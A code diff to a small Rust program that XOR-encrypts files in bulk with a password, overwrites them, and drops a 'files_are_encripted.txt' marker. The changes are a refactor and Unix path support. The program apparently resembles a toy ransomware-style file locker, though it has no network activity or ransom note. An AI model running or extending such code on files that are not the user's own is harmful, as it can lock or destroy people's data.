@@ -95,6 +95,8 @@ fn main() -> io::Result<()> {
     Err(v) => return Err(v),
   };
 
+  let re = regex::Regex::new(r"files_are_encripted").unwrap();
+
   let mut is_decripting = false;
   for filename in files {
     let mut content = match read_file_content(&filename) {
@@ -104,21 +106,21 @@ fn main() -> io::Result<()> {
 
     xor_file_content(&mut content, &password);
 
-    let re = regex::Regex::new(r"files_are_encripted").unwrap();
-    match re.find(&filename) {
-      Some(_) => {
-          is_decripting = true;
-          fs::remove_file(&filename)?;
-      },
-      None => {
-        write_xored_contend_to_files(&mut content, &filename)?;
-      },
-    };
+    if re.is_match(&filename) {
+      is_decripting = true;
+      fs::remove_file(&filename)?;
+    } else {
+      write_xored_contend_to_files(&mut content, &filename)?;
+    }
   }
 
   if !is_decripting {
     let exec_path = env::current_dir()?;
-    File::create(String::from(exec_path.to_str().unwrap()) + "\\files_are_encripted.txt")?;
+    if cfg!(windows) {
+      File::create(String::from(exec_path.to_str().unwrap()) + "\\files_are_encripted.txt")?;
+    } else if cfg!(unix) {
+      File::create(String::from(exec_path.to_str().unwrap()) + "/files_are_encripted.txt")?;
+    }
   }
 
   Ok(())
